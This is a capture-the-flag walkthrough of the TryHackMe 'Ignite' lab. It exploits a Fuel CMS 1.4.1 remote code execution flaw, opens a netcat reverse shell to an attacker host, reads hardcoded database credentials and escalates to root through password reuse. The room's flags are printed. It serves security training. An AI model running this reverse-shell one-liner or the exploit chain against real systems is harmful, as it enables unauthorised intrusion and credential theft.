
# TryHackMe: Ignite Write-Up

A complete walkthrough of the **Ignite** room on TryHackMe, demonstrating the exploitation of a vulnerable Fuel CMS instance to gain
initial access, establish a stable shell, enumerate sensitive configuration files, and escalate privileges to root.

---

## Room Information

| Category | Details |
|-----------|----------|
| Room | Ignite |
| Platform | TryHackMe |
| Difficulty | Easy |
| Target OS | Linux (Ubuntu) |
| Vulnerability | Fuel CMS 1.4.1 Remote Code Execution |
| Privilege Escalation | Password Reuse |

---

# Executive Summary

This machine demonstrates how an outdated web application can lead to complete system compromise. The target was running 
**Fuel CMS 1.4.1**, which is vulnerable to **Remote Code Execution (CVE-2018-16763)**.

After obtaining code execution through a public exploit, a reverse shell was established to gain a more stable session. 
During post-exploitation enumeration, database credentials were discovered in the Fuel CMS configuration files. The recovered 
password was reused by the root account, allowing direct privilege escalation and full compromise of the system.

---

# Attack Chain

1. Enumerate services using Nmap.
2. Identify Fuel CMS 1.4.1.
3. Research publicly available exploits.
4. Exploit Fuel CMS RCE vulnerability.
5. Obtain remote command execution as `www-data`.
6. Establish a reverse shell.
7. Retrieve the user flag.
8. Discover database credentials in configuration files.
9. Reuse credentials to switch to root.
10. Capture the root flag.

---

# Reconnaissance

The first step was to identify open ports and running services.

## Nmap Scan

```bash
nmap -sV -sC -O <TARGET_IP> -oN nmap.txt
```

### Results

```text
PORT   STATE SERVICE VERSION
80/tcp open  http Apache httpd 2.4.18 ((Ubuntu))

http-title: Welcome to FUEL CMS
http-robots.txt: 1 disallowed entry
/fuel/
```

### Findings

- Apache web server running on port 80.
- Fuel CMS identified from the homepage.
- `robots.txt` revealed the `/fuel/` directory.

---

# Vulnerability Research

Knowing the target was running Fuel CMS, the next step was to search for public exploits.

```bash
searchsploit fuel cms 1.4
```

### Results

```text
Fuel CMS 1.4.1 - Remote Code Execution (1)
Fuel CMS 1.4.1 - Remote Code Execution (2)
Fuel CMS 1.4.1 - Remote Code Execution (3)
```

The target version was vulnerable to **CVE-2018-16763**, a Remote Code Execution vulnerability.

---

# Exploitation

## Attempt 1

The first exploit tested was:

```bash
searchsploit -m linux/webapps/47138.py
```

However, executing the exploit resulted in a Python compatibility error:

```text
SyntaxError: Missing parentheses in call to 'print'
```

The exploit was written for Python 2 and failed under Python 3.

---

## Attempt 2

A second exploit was downloaded:

```bash
searchsploit -m php/webapps/50477.py
```

The exploit was then executed against the target.

```bash
python3 50477.py -u http://<TARGET_IP>/
```

### Initial Access

The exploit successfully provided command execution.

```bash
Enter Command $ whoami
```

Output:

```text
www-data
```

The web server process was running as the `www-data` user.

---

# Establishing a Reverse Shell

The web shell was limited and did not provide a stable interactive session.

A Netcat listener was started on the attack machine:

```bash
nc -lvnp 4444
```

A reverse shell payload was then executed through the RCE vulnerability:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Once the connection was received, a fully interactive shell was spawned:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Terminal stabilization:

```bash
export TERM=xterm
stty raw -echo
```

A stable shell was now available.

---

# User Flag

Enumerating the filesystem revealed the user flag.

```bash
cd /home/www-data
ls
```

Output:

```text
flag.txt
```

Reading the flag:

```bash
cat flag.txt
```

Output:

```text
6470e394cbf6dab6a91682cc8585059b
```

### User Flag

```text
6470e394cbf6dab6a91682cc8585059b
```

---

# Post-Exploitation Enumeration

After obtaining a stable shell, further enumeration focused on identifying credentials and privilege escalation opportunities.

## Reviewing Fuel CMS Configuration Files

Fuel CMS stores database credentials inside:

```text
/var/www/html/fuel/application/config/database.php
```

Viewing the file:

```bash
cat /var/www/html/fuel/application/config/database.php
```

### Interesting Findings

```php
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema'
```

Credentials were hardcoded inside the application configuration.

---

# Privilege Escalation

The database password appeared promising.

```text
Username: root
Password: mememe
```

Attempting to switch users:

```bash
su root
```

Password entered:

```text
mememe
```

Successful authentication:

```bash
whoami
```

Output:

```text
root
```

Root access was obtained through password reuse.

---

# Root Flag

Navigating to the root directory:

```bash
cd /root
ls
```

Output:

```text
root.txt
```

Reading the flag:

```bash
cat root.txt
```

Output:

```text
b9bbcb33e11b80be759c4e844862482d
```

### Root Flag

```text
b9bbcb33e11b80be759c4e844862482d
```

---

# Key Takeaways

- Outdated CMS platforms often contain publicly available exploits.
- Remote Code Execution vulnerabilities can quickly lead to full system compromise.
- Reverse shells provide significantly better post-exploitation capabilities than simple web shells.
- Sensitive credentials should never be stored in plaintext configuration files.
- Password reuse between applications and system accounts can result in complete privilege escalation.

---

# Skills Demonstrated

- Network Enumeration
- Web Application Assessment
- Vulnerability Research
- Exploit Adaptation
- Remote Code Execution
- Reverse Shell Handling
- Linux Enumeration
- Credential Discovery
- Privilege Escalation
- Post-Exploitation

---

**Room Completed Successfully**
````


